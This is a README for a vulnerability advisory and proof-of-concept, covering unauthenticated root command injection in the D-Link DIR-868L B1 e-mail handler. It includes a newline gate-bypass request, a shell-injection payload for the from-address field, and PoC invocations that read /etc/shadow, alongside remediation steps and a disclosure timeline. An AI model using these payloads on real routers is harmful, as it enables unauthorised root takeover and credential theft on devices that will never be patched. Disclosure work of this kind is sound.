# DIR-868L-Email-RCE — unauthenticated root command injection in the D-Link DIR-868L B1 e-mail handler

Public advisory and PoC for an unauthenticated OS command injection in the
D-Link DIR-868L B1 (firmware 2.03b01) e-mail settings/test handler.

| | |
|---|---|
| Vendor | D-Link |
| Product | DIR-868L, hardware revision B1 |
| Firmware | 2.03b01 (`DIR868LB1_FW203b01.bin`, SHA-256 `9af5829b628d6274f4a7fe8f3926aaa7cc51760579aa4fa117c384f96b44a2c5`) |
| Same vulnerable files | 2.01b05 and 2.05 family (2.05 / 2.05WW / 2.05b01), byte-identical (static) |
| Class | CWE-78; CWE-863 / CWE-93 access vector |
| CVSS 3.1 | 9.8 `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Attack | Network, unauthenticated, no user interaction |
| Impact | Arbitrary command execution as **root**, with output read-back |
| Vendor status | End-of-life (D-Link SAP10397); no fix expected |
| CVE | pending (VulDB submission, 2026-11-22) |

## Summary

`/goform/form_emailsetting` stores the attacker-controlled
`config.smtp_email_from_email_addr` value in `/device/log/email/from` and fires
the `MYDLINK_TESTMAIL` event. The event chain
`mdtestmail` → `mydlinkeventd` → `phpsh /etc/scripts/mydlink/MYDLINKMAIL.php`
renders that value into an **unquoted** shell command:

```
email -V -f <from> ... <to> &
```

which `phpsh` executes as **root**. A value such as

```
a;cd /var/htdocs/upnp/LAN-1;exec >out.gif 2>&1;<command>;#
```

runs arbitrary commands as root; the output is written under
`/var/htdocs/upnp/LAN-1/` and can be fetched over TCP/49152.

The handler is gated by `header.php` (`$AUTHORIZED_GROUP>=0`). phpcgi decodes
`%0a` in query values and the xmldb ePHP engine is FIRST-WINS on duplicate
globals, so

```
GET /goform/form_emailsetting?x=AAA%0aAUTHORIZED_GROUP=0
```

bypasses the gate (`500` → `200`). A second unauthenticated POST writes the
payload and triggers the event — pre-authentication root RCE.

The `AUTHORIZED_GROUP` newline primitive is known on this model from
CVE-2019-17506 (different endpoint, `getcfg.php`, credential disclosure). The
command injection in the e-mail handler reported here is a different endpoint
and a different impact, and is also reachable by an authenticated
administrator.

## Quick start

```bash
# gate check only
python3 poc/poc_DIR868L_AG0_RCE.py --check 192.168.0.1

# run a command and print the output
python3 poc/poc_DIR868L_AG0_RCE.py 192.168.0.1 'cat /proc/self/status; cat /etc/shadow'

# keep the evidence file and the e-mail config
python3 poc/poc_DIR868L_AG0_RCE.py --no-clean 192.168.0.1 uname -a
```

The PoC performs the gate check, the POST, polls
`http://TARGET:49152/<mark>.gif`, prints the command output and restores the
e-mail baseline (`enable=0`, `from/to/subject/server/...` empty) by default.

Requirements: Python 3.6+, network access to TCP/80 and TCP/49152 of the
device. The device must have the factory `router` layout so that
`MYDLINK_TESTMAIL` is registered at boot (factory default).

## Verification

- **Physical unit** (FW 2.03b01, LAN side): gate `500` → `200`, unauthenticated
  POST `200 test ok`, command output `Uid: 0 0 0 0`,
  `CapEff ffffffffffffffff`, `/etc/shadow` `root:!:20778`,
  kernel `2.6.36.4brcmarm+`. Re-verified on 2026-11-22 (MAC
  `E4:6F:13:3E:AE:04`, FW 2.03). Raw evidence:
  `evidence/physical_r357_redacted.txt` and
  `evidence/physical_reverify_redacted.txt` (credential hashes redacted).
- **FirmAE full-system emulation** (same firmware): `Uid: 0 0 0 0`,
  `CapEff 0000003fffffffff`, `/etc/shadow` `root:!:10957`, kernel 4.1.17.
  See `evidence/root_rce_output_redacted.txt`.
- **Static**: `form_emailsetting`, `header.php`, `MYDLINKMAIL.php` and `xmldb`
  are byte-identical in 2.01b05, 2.03b01 and the 2.05 family
  (`analysis/root_cause.md`).

## Files

| Path | Content |
|---|---|
| `ADVISORY.md` | full advisory (root cause, impact, remediation timeline) |
| `poc/poc_DIR868L_AG0_RCE.py` | one-shot PoC |
| `analysis/root_cause.md` | technical deep dive |
| `evidence/gate_plain_500.http` | control response |
| `evidence/gate_bypass_200.http` | gate-bypass response |
| `evidence/root_rce_output_redacted.txt` | root output (hash-redacted) |
| `evidence/physical_r357_redacted.txt` | physical-unit evidence 2026-11-21 (hash-redacted) |
| `evidence/physical_reverify_redacted.txt` | physical-unit re-verification 2026-11-22 (hash-redacted) |
| `evidence/hashes.txt` | firmware/component SHA-256 |

## Related vulnerabilities (not duplicates)

| CVE | Relation |
|---|---|
| CVE-2019-17506 | Same `AUTHORIZED_GROUP` newline primitive on DIR-868L B1-2.03, but `getcfg.php` and credential disclosure; different endpoint/impact |
| CVE-2018-19987 / CVE-2018-19988 | HNAP command injection on DIR-868L Rev.B 2.05B02 — different handlers |
| CVE-2026-110536 | HNAP `SOAPACTION` command injection on DIR-868L 2.01b05 — different handler |
| CVE-2025-14659 | DHCP hostname command injection on DIR-860L/868L B1 203b01/203b03 |
| CVE-2026-3485 | SSDP `ST` command injection on DIR-868L 110b03 |
| CVE-2025-55583 | `fileaccess.cgi` `pre_api_arg` command injection on DIR-868L B1 2.05WWB02 |
| CVE-2023-32153 / CVE-2023-44422 / CVE-2025-60701 | E-mail-field command injection on other D-Link models — same class, different product/code |

Prior-art check: NVD contains 25 `DIR-868L` entries; `form_emailsetting`,
`MYDLINKMAIL`, `mdtestmail` and `smtp_email_from_email_addr` return 0 hits
(2026-11-22).

## Remediation

1. Never build shell command lines from configuration values; invoke the mail
   program with an argv array.
2. Quote/validate `from`/`to`/subject in `form_emailsetting`; reject control
   characters and shell metacharacters.
3. Remove the privileged `phpsh` rendering for mail/event scripts.
4. Namespace `AUTHORIZED_GROUP`, reject duplicate globals and `\r`/`\n` in
   query values, and authenticate before rendering `/goform` scripts.
5. The DIR-868L is EOL — replace the device.

## Disclosure

| Date | Event |
|---|---|
| 2026-11-21 | Physical-unit end-to-end verification |
| 2026-11-22 | Static cross-version verification, prior-art check, VulDB submission |
| TBD | Public advisory/PoC publication (this repository) |

## Disclaimer

This material is provided for vulnerability verification on **owned devices**
and coordinated disclosure only. Do not use it against devices you do not own
or are not authorized to test. The e-mail settings and evidence files modified
by the PoC are restored by default; use `--no-clean` only on a device you own.

## Credit

Discovered and researched by **Walnut1337** (`walnut1337@163.com`), 2026-11.
